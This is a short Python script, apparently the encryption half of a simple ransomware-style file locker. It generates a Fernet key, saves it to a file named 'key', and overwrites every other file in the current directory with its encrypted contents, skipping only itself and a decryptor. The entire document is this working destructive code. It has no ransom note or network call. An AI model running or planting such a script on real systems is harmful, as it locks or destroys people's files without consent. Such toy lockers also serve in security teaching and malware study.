#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file in ["encrypt.py", "key", "decrypt.py"]:
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("key", "wb") as fp:
    fp.write(key)

for file in files:
    with open(file, "rb") as fp:
        contents = fp.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as fp:
        fp.write(encrypted_contents)
